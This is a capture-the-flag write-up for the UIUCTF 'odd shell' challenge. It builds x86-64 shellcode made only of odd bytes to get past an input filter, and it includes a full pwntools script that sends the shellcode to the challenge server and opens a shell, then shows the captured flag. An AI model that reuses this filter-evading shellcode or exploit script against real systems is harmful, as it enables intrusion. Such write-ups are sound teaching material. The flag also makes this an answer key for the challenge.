# odd shell

## description

O ho! You found me! I have a display of oddities available to you! ``$ nc odd-shell.chal.uiuc.tf 1337``
author: Surg

## solution

The challenge binary accepts only odd byte shellcode

```
000012f6          if ((((uint32_t)*(int8_t*)((char*)rax + var_18)) & 1) == 0)
000012f4          {
000012f6              break;
000012f6          }
0000130e          var_18 = (var_18 + 1);
0000130e      }
000012ff      puts("Invalid Character");
```

This presents a problem for a standard ``shellcraft.sh()``, which contains 25 even bytes in the shellcode

```
└─# python3 test.py 
[*] ----------------------------
[*] Finding Bad Bytes in Shellcode:
[!]     Bad Byte: 0x6a
[!]     Bad Byte: 0x68
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0xb8
[!]     Bad Byte: 0x62
[!]     Bad Byte: 0x6e
[!]     Bad Byte: 0x50
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0x68
[!]     Bad Byte: 0x72
[!]     Bad Byte: 0x34
[!]     Bad Byte: 0x24
[!]     Bad Byte: 0xf6
[!]     Bad Byte: 0x56
[!]     Bad Byte: 0x6a
[!]     Bad Byte: 0x8
[!]     Bad Byte: 0x5e
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0xe6
[!]     Bad Byte: 0x56
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0xe6
[!]     Bad Byte: 0xd2
[!]     Bad Byte: 0x6a
[!]     Bad Byte: 0x58
[*] ----------------------------
[*] Total Violations: 25
[*] ----------------------------
[*]    0:   6a 68                   push   0x68
       2:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
       c:   50                      push   rax
       d:   48 89 e7                mov    rdi, rsp
      10:   68 72 69 01 01          push   0x1016972
      15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
      1c:   31 f6                   xor    esi, esi
      1e:   56                      push   rsi
      1f:   6a 08                   push   0x8
      21:   5e                      pop    rsi
      22:   48 01 e6                add    rsi, rsp
      25:   56                      push   rsi
      26:   48 89 e6                mov    rsi, rsp
      29:   31 d2                   xor    edx, edx
      2b:   6a 3b                   push   0x3b
      2d:   58                      pop    rax
      2e:   0f 05                   syscall
```
However, we make some modifications to the shellcode and remove all the even bytes. Interestingly, we learned that the ``[mov | xor | add | push | xchg] r[9|11|13]`` are mostly odd byte instructions. Other than that, the hardest part was using an ``xor`` and ``add`` to remove the even bytes from the ``/bin/sh`` string.

```python
    shell = asm("""
       /* push 0x68 */
       mov r15b, 0x35
       add r15, 0x33
       push r15

       /* push 0x732f2f2f6e69622f */
       mov r11, ((0x732f2f2f6e69622f-0xffeffff)^0x01010101)
       xor r11, 0x01010101
       add r11, (0xffeffff)/2
       add r11, (0xffeffff)/2
       add r11, 0x1
       push r11

       /* rdi = rsp */
       xchg r9, rsp
       xchg r9, rdi

       /* rsi = 0x0 */
       xor r13, r13
       xchg r13, rsi
     
       /* rdx = 0x0 */
       xor r13, r13
       xchg r13, rdx

       /* rax = 0x3b */
       mov r9b, 0x3b
       xchg r9, rax

       /* execve(rdi="/bin/sh",rsi=0x0,rdx=0x0) */
       syscall
    """)
```

Our final solution is here

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
break *$rebase(0x1326)
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('odd-shell.chal.uiuc.tf', 1337)
    else:
        return process(e.path)


def build_odd_shellcode():
    shell = asm("""
       /* push 0x68 */
       mov r15b, 0x35
       add r15, 0x33
       push r15

       /* push 0x732f2f2f6e69622f */
       /*  0x732f2f2f5f686331* /
       /*  0x0000000000010000*/
       mov r11, ((0x732f2f2f6e69622f-0xffeffff)^0x01010101)
       xor r11, 0x01010101
       add r11, (0xffeffff)/2
       add r11, (0xffeffff)/2
       add r11, 0x1
       push r11

       /* rdi = rsp */
       xchg r9, rsp
       xchg r9, rdi

       /* rsi = 0x0 */
       xor r13, r13
       xchg r13, rsi
     
       /* rdx = 0x0 */
       xor r13, r13
       xchg r13, rdx

       /* rax = 0x3b */
       mov r9b, 0x3b
       xchg r9, rax

       /* execve(rdi="/bin/sh",rsi=0x0,rdx=0x0) */
       syscall
    """)
    return shell


shell = build_odd_shellcode()

p = start()
p.recvline(b'Display your oddities:')
p.sendline(shell)
p.interactive()
```

Running it yields the flag

```
python3 test.py BIN=./chal REMOTE
[*] '/root/workspace/uictf/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to odd-shell.chal.uiuc.tf on port 1337: Done
[*] Switching to interactive mode
Display your oddities:
$ cat /flag
uiuctf{5uch_0dd_by4t3s_1n_my_r3g1st3rs!}
```